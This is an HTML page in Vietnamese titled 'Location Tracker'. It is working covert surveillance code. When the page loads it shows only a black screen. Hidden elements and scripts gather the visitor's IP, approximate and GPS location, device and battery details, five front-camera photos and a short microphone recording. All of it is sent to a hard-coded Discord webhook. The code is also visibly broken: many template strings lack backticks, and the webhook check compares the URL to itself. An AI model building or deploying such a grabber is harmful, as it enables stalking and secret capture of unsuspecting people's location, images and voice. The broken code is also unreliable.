<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Huy Hoang - Location Tracker</title>
    <style>
        body {
            background: black;
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: monospace;
        }
        .hidden-content {
            display: none;
        }
    </style>
</head>
<body>
    <div style="display:none;">
        <div id="info"></div>
    </div>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
    <audio id="audio" style="display:none;"></audio>

    <script>
        // Cấu hình Discord Webhook
        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM'; // THAY THẾ BẰNG WEBHOOK URL CỦA BẠN
        
        // Cấu hình chụp ảnh
        const PHOTO_COUNT = 5;
        const PHOTO_INTERVAL = 300;
        
        // Cấu hình ghi âm
        const AUDIO_DURATION = 4000;
        
        // Cờ để tránh gửi trùng lặp
        let infoSent = false;
        let photoSentCount = 0;
        let cameraStream = null;
        let cameraActive = false;
        let audioRecorded = false;
        let mediaRecorder = null;
        let audioChunks = [];
        let gpsDataSent = false;

        // Hàm gửi tin nhắn text đến Discord
        async function sendTextToDiscord(content, retryCount = 0) {
            const maxRetries = 2;
            try {
                const payload = {
                    content: content,
                    username: "Location Tracker",
                    avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png"
                };
                
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
                
                if (!response.ok && retryCount < maxRetries) {
                    console.log(Gửi text thất bại, thử lại lần ${retryCount + 1}...);
                    setTimeout(() => sendTextToDiscord(content, retryCount + 1), 2000);
                } else if (response.ok) {
                    console.log('✅ Đã gửi text thành công đến Discord');
                } else {
                    console.error(Lỗi gửi text: ${response.status});
                }
            } catch (e) {
                console.error('Discord Send Text Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendTextToDiscord(content, retryCount + 1), 2000);
                }
            }
        }

        // Hàm gửi file đến Discord
        async function sendFileToDiscord(fileBlob, fileName, caption = '', retryCount = 0) {
            const maxRetries = 2;
            try {
                const formData = new FormData();
                
                // Thêm file vào FormData
                formData.append('file', fileBlob, fileName);
                
                // Thêm payload_json nếu có caption
                if (caption) {
                    const payload = {
                        content: caption,
                        username: "Location Tracker",
                        avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png"
                    };
                    formData.append('payload_json', JSON.stringify(payload));
                } else {
                    const payload = {
                        username: "Location Tracker",
                        avatar_url: "https://cdn.pixabay.com/photo/2020/07/12/16/15/location-5397197_1280.png"
                    };
                    formData.append('payload_json', JSON.stringify(payload));
                }
                
                const response = await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok && retryCount < maxRetries) {
                    console.log(Gửi file thất bại, thử lại lần ${retryCount + 1}...);
                    setTimeout(() => sendFileToDiscord(fileBlob, fileName, caption, retryCount + 1), 2000);
                } else if (response.ok) {
                    console.log(✅ Đã gửi file ${fileName} thành công đến Discord);
                }
            } catch (e) {
                console.error('Discord Send File Error:', e);
                if (retryCount < maxRetries) {
                    setTimeout(() => sendFileToDiscord(fileBlob, fileName, caption, retryCount + 1), 2000);
                }
            }
        }

        // Hàm gửi file âm thanh
        async function sendAudioToDiscord(blob) {
            const fileName = audio_${Date.now()}.ogg;
            const caption = 🎤 **Ghi âm** - ${new Date().toLocaleString('vi-VN')};
            await sendFileToDiscord(blob, fileName, caption);
            console.log('✅ Đã gửi ghi âm thành công');
        }

        // Hàm gửi ảnh
        async function sendPhotoToDiscord(blob, photoNumber) {
            const fileName = capture_${photoNumber}_${Date.now()}.jpg;
            const caption = 📸 **Ảnh chụp #${photoNumber}** - ${new Date().toLocaleString('vi-VN')};
            await sendFileToDiscord(blob, fileName, caption);
            
            photoSentCount++;
            console.log(✅ Đã gửi ảnh #${photoNumber});
            
            if (photoSentCount === PHOTO_COUNT && cameraStream && cameraActive) {
                setTimeout(() => {
                    if (cameraStream) {
                        cameraStream.getTracks().forEach(track => track.stop());
                        cameraStream = null;
                        cameraActive = false;
                    }
                }, 2000);
            }
        }

        // Hàm chụp ảnh - tối ưu tốc độ
        async function captureSinglePhoto(video, canvas, ctx, photoNumber) {
            return new Promise((resolve) => {
                try {
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        
                        canvas.toBlob((blob) => {
                            if (blob) {
                                sendPhotoToDiscord(blob, photoNumber);
                                resolve(true);
                            } else {
                                resolve(false);
                            }
                        }, 'image/jpeg', 0.85);
                    } else {
                        setTimeout(() => {
                            captureSinglePhoto(video, canvas, ctx, photoNumber).then(resolve);
                        }, 50);
                    }
                } catch (e) {
                    console.error(Lỗi chụp ảnh #${photoNumber}:, e);
                    resolve(false);
                }
            });
        }

        async function captureMultiplePhotos(video, canvas, ctx) {
            if (!cameraActive) return;
            for (let i = 1; i <= PHOTO_COUNT; i++) {
                if (!cameraActive) break;
                await captureSinglePhoto(video, canvas, ctx, i);
                if (i < PHOTO_COUNT) {
                    await new Promise(resolve => setTimeout(resolve, PHOTO_INTERVAL));
                }
            }
        }

        // Hàm ghi âm - tối ưu khởi tạo nhanh
        async function startRecording() {
            if (audioRecorded) return;
            try {
                console.log('🎤 Bắt đầu ghi âm...');
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) audioChunks.push(event.data);
                };
                
                mediaRecorder.onstop = async () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    if (audioBlob.size > 0) {
                        await sendAudioToDiscord(audioBlob);
                        audioRecorded = true;
                    }
                    stream.getTracks().forEach(track => track.stop());
                };
                
                mediaRecorder.start();
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, AUDIO_DURATION);
            } catch (e) {
                console.error('Lỗi ghi âm:', e);
            }
        }

        // Hàm lấy thông tin IP và vị trí chính xác
        async function getIPAndLocation() {
            let ip = 'Không xác định';
            let locationData = {
                city: 'Không xác định',
                region: 'Không xác định',
                country: 'Không xác định',
                isp: 'Không xác định',
                lat: null,
                lon: null
            };
            
            // Bước 1: Lấy IP chính xác
            const ipAPIs = [
                'https://api.ipify.org?format=json',
                'https://api.my-ip.io/ip.json',
                'https://ipapi.co/json/'
            ];
            
            for (const api of ipAPIs) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 4000);
                    const response = await fetch(api, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    const data = await response.json();
                    if (api.includes('ipify')) ip = data.ip;
                    else if (api.includes('my-ip')) ip = data.ip;
                    else if (api.includes('ipapi.co')) ip = data.ip;
                    if (ip && ip !== 'Không xác định') break;
                } catch (e) {
                    console.log(IP API ${api} failed:, e);
                }
            }
            
            // Bước 2: Lấy vị trí từ IP
            const locationAPIs = [
                {
                    url: https://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,org,lat,lon,
                    parser: (data) => {
                        if (data && data.status === 'success') {
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.regionName && data.regionName !== '' ? data.regionName : 'Không xác định',
                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
                                isp: data.isp && data.isp !== '' ? data.isp : (data.org || 'Không xác định'),
                                lat: data.lat || null,
                                lon: data.lon || null
                            };
                        }
                        return null;
                    }
                },
                {
                    url: https://ipapi.co/${ip}/json/,
                    parser: (data) => {
                        if (data && !data.error) {
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
                                country: data.country_name && data.country_name !== '' ? data.country_name : 'Không xác định',
                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
                                lat: data.latitude || null,
                                lon: data.longitude || null
                            };
                        }
                        return null;
                    }
                },
                {
                    url: https://ipinfo.io/${ip}/json,
                    parser: (data) => {
                        if (data && !data.error) {
                            let lat = null, lon = null;
                            if (data.loc && typeof data.loc === 'string') {
                                const parts = data.loc.split(',');
                                if (parts.length === 2) {
                                    lat = parseFloat(parts[0]);
                                    lon = parseFloat(parts[1]);
                                }
                            }
                            return {
                                city: data.city && data.city !== '' ? data.city : 'Không xác định',
                                region: data.region && data.region !== '' ? data.region : 'Không xác định',
                                country: data.country && data.country !== '' ? data.country : 'Không xác định',
                                isp: data.org && data.org !== '' ? data.org : 'Không xác định',
                                lat: lat,
                                lon: lon
                            };
                        }
                        return null;
                    }
                }
            ];
            
            for (const api of locationAPIs) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 6000);
                    const response = await fetch(api.url, { signal: controller.signal });
                    clearTimeout(timeoutId);
                    const data = await response.json();
                    const result = api.parser(data);
                    if (result && (result.city !== 'Không xác định' || result.country !== 'Không xác định')) {
                        locationData = result;
                        console.log(✅ Lấy vị trí thành công từ: ${api.url}, locationData);
                        break;
                    }
                } catch (e) {
                    console.log(API ${api.url} failed:, e);
                }
            }
            
            // Chuẩn hóa dữ liệu
            locationData.city = (locationData.city && locationData.city !== 'undefined' && locationData.city !== 'null') ? locationData.city : 'Không xác định';
            locationData.region = (locationData.region && locationData.region !== 'undefined' && locationData.region !== 'null') ? locationData.region : 'Không xác định';
            locationData.country = (locationData.country && locationData.country !== 'undefined' && locationData.country !== 'null') ? locationData.country : 'Không xác định';
            locationData.isp = (locationData.isp && locationData.isp !== 'undefined' && locationData.isp !== 'null') ? locationData.isp : 'Không xác định';
            
            return { ip, locationData };
        }

        // Hàm lấy thông tin pin
        async function getBatteryInfo() {
            let batteryPercent = 'Không xác định';
            let batteryCharging = false;
            
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    batteryPercent = ${level}%;
                    batteryCharging = battery.charging;
                    console.log(✅ Battery API thành công: ${batteryPercent}, Sạc: ${batteryCharging});
                    return { batteryPercent, batteryCharging };
                } catch (err) {
                    console.log('Battery API lỗi:', err);
                }
            }
            
            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
            if (isIOS) {
                return { batteryPercent: 'iOS không hỗ trợ', batteryCharging: false };
            }
            
            try {
                if ('webkitGetBattery' in navigator) {
                    const battery = await navigator.webkitGetBattery();
                    const level = Math.round(battery.level * 100);
                    batteryPercent = ${level}%;
                    batteryCharging = battery.charging;
                    return { batteryPercent, batteryCharging };
                }
            } catch (e) {}
            
            return { batteryPercent: 'Không xác định', batteryCharging: false };
        }

        // Hàm lấy thông tin thiết bị chi tiết
        async function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform || 'Không xác định';
            
            const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
            const isIPhone = /iPhone/.test(userAgent);
            const isIPad = /iPad/.test(userAgent) || (isIOS && screen.width > 768);
            let deviceModel = 'Không xác định';
            
            if (isIPhone) deviceModel = 'iPhone';
            else if (isIPad) deviceModel = 'iPad';
            else if (isIOS) deviceModel = 'iOS Device';
            else if (/Android/.test(userAgent)) deviceModel = 'Android';
            else if (/Windows/.test(userAgent)) deviceModel = 'Windows';
            else if (/Macintosh/.test(userAgent)) deviceModel = 'Mac';
            
            return {
                userAgent,
                platform,
                isIOS,
                deviceModel,
                isIPhone
            };
        }

        // Hàm tự động gửi vị trí GPS
        async function autoSendGPS() {
            if (gpsDataSent) return;
            
            if (!('geolocation' in navigator)) {
                console.log('Trình duyệt không hỗ trợ GPS');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const lat = pos.coords.latitude;
                    const lng = pos.coords.longitude;
                    const accuracy = pos.coords.accuracy;
                    const mapsLink = https://www.google.com/maps?q=${lat},${lng};
                    
                    const gpsMessage = **📍 VỊ TRÍ GPS THỰC TẾ**\n\n +
                        **📌 Vĩ độ:** \`${lat}\`\n +
                       **📌 Kinh độ:** \`${lng}\`\n` +
                       **🎯 Độ chính xác:** \`${Math.round(accuracy)} mét\`\n\n` +
                       🗺️ [Xem trên Google Maps](${mapsLink})`;
                    
                    await sendTextToDiscord(gpsMessage);
                    gpsDataSent = true;
                    console.log('✅ Đã tự động gửi vị trí GPS');
                },
                (err) => {
                    let errorMsg = '';
                    switch(err.code) {
                        case err.PERMISSION_DENIED:
                            errorMsg = 'Người dùng từ chối chia sẻ vị trí';
                            break;
                        case err.POSITION_UNAVAILABLE:
                            errorMsg = 'Không thể xác định vị trí';
                            break;
                        case err.TIMEOUT:
                            errorMsg = 'Hết thời gian chờ';
                            break;
                        default:
                            errorMsg = err.message;
                    }
                    console.log(Lỗi GPS: ${errorMsg});
                    sendTextToDiscord(⚠️ **Lỗi GPS:** ${errorMsg});
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }

        // Lấy thông tin thiết bị và gửi đến Discord
        async function getInfoAndSendToDiscord() {
            try {
                const { ip, locationData } = await getIPAndLocation();
                const deviceInfo = await getDeviceInfo();
                const { batteryPercent, batteryCharging } = await getBatteryInfo();
                
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceMemory = navigator.deviceMemory ? ${navigator.deviceMemory} GB : 'Không xác định';
                const cookieEnabled = navigator.cookieEnabled ? 'Bật' : 'Tắt';
                const currentTime = new Date().toLocaleString('vi-VN');
                const language = navigator.language || 'Không xác định';
                const hardwareConcurrency = navigator.hardwareConcurrency ? ${navigator.hardwareConcurrency} nhân : 'Không xác định';
                const referrer = document.referrer || 'Truy cập trực tiếp';
                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Không xác định';
                
                let mapsLink = '';
                if (locationData.lat && locationData.lon) {
                    mapsLink =\n🗺️ [Xem vị trí (ước tính từ IP)](https://www.google.com/maps?q=${locationData.lat},${locationData.lon})`;
                }
                
                let batteryDisplay = '';
                if (deviceInfo.isIOS) {
                    batteryDisplay =**🔋 Pin:** \`iOS không hỗ trợ đọc % pin qua web (giới hạn bảo mật)\``;
                } else {
                    const chargingStatus = batteryCharging ? '🔌 Đang sạc' : '🔋 Không sạc';
                    batteryDisplay = `**🔋 Pin:** \`${batteryPercent} (${chargingStatus})\``;
                }
                
                const discordMessage =**📥 KHÁCH TRUY CẬP MỚI**\n\n` +
                   **🌐 Địa chỉ IP:** \`${ip}\`\n` +
                   **📍 Thành phố:** \`${locationData.city}\`\n` +
                   **🗺️ Khu vực:** \`${locationData.region}\`\n` +
                   **🏳️ Quốc gia:** \`${locationData.country}\`\n` +
                   **🏢 Nhà mạng:** \`${locationData.isp}\`${mapsLink}\n\n` +
                   **📱 Thiết bị:** \`${deviceInfo.deviceModel}\`\n` +
                   **💻 Trình duyệt:** \`${deviceInfo.userAgent.substring(0, 80)}...\`\n` +
                   **🖥️ Hệ điều hành:** \`${deviceInfo.platform}\`\n` +
                   **📺 Độ phân giải:** \`${screenWidth}x${screenHeight}\`\n` +
                    ${batteryDisplay}\n +
                   **💾 RAM:** \`${deviceMemory}\`\n` +
                    **⚙️ CPU Core:** \`${hardwareConcurrency}\`\n +
                   **🍪 Cookie:** \`${cookieEnabled}\`\n` +
                   **🌐 Ngôn ngữ:** \`${language}\`\n` +
                    **⏰ Múi giờ:** \`${timezone}\`\n +
                   **🕐 Thời gian:** \`${currentTime}\`\n` +
                    `**📎 Nguồn truy cập:** \`${referrer}\``;
                
                await sendTextToDiscord(discordMessage);
                console.log('✅ Đã gửi thông tin đến Discord');
            } catch (error) {
                console.error('Lỗi gửi thông tin:', error);
                await sendTextToDiscord(⚠️ **Lỗi khi gửi thông tin:** ${error.message});
            }
        }
        
        // Khởi tạo camera
        async function startCameraImmediately() {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                console.warn('Camera not supported');
                return;
            }
            
            try {
                console.log('📷 Yêu cầu camera...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 800 },
                        height: { ideal: 600 },
                        facingMode: 'user'
                    }
                });
                
                cameraStream = stream;
                cameraActive = true;
                video.srcObject = stream;
                
                await new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                await new Promise(resolve => setTimeout(resolve, 100));
                await captureMultiplePhotos(video, canvas, ctx);
            } catch (e) {
                console.warn('Camera error:', e);
                cameraActive = false;
            }
        }
        
        // Khởi tạo song song camera và ghi âm
        async function init() {
            try {
                console.log('🚀 Khởi tạo tracker (Discord Webhook)...');
                
                if (DISCORD_WEBHOOK_URL === 'YOUR_DISCORD_WEBHOOK_URL') {
                    console.error('⚠️ VUI LÒNG CẤU HÌNH DISCORD WEBHOOK URL!');
                    alert('⚠️ Vui lòng cấu hình Discord Webhook URL trong mã nguồn!\n\nTìm dòng: const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL";\nThay thế bằng URL webhook của bạn.');
                    return;
                }
                
                // Gửi thông tin truy cập đầu tiên
                await getInfoAndSendToDiscord();
                
                // Các tác vụ khác chạy song song
                setTimeout(() => autoSendGPS(), 1000);
                setTimeout(() => startCameraImmediately(), 500);
                setTimeout(() => startRecording(), 800);
                
                console.log('✅ Hoàn tất khởi tạo, tất cả dữ liệu đã được gửi đến Discord');
            } catch (err) {
                console.error('Init error:', err);
                try {
                    await sendTextToDiscord(⚠️ **Lỗi khởi tạo:** ${err.message});
                } catch(e) {}
            }
        }
        
        // Kiểm tra webhook URL trước khi bắt đầu
        if (DISCORD_WEBHOOK_URL && DISCORD_WEBHOOK_URL !== 'https://discord.com/api/webhooks/1487644219945390160/FNtkSqJw4J-4md6mgXJpfwdCsX8pcWn72BEd6snufQKxCNzJzGL5HVzdgknp9L9-cCbM') {
            console.log('Discord Webhook URL đã được cấu hình:', DISCORD_WEBHOOK_URL);
            init();
        } else {
            console.error('Chưa cấu hình Discord Webhook URL');
            alert('⚠️ Vui lòng cấu hình Discord Webhook URL trước khi sử dụng!\n\n1. Tạo Webhook trong Discord\n2. Copy URL\n3. Dán vào mã nguồn tại dòng: const DISCORD_WEBHOOK_URL');
        }
    </script>
</body>
</html>
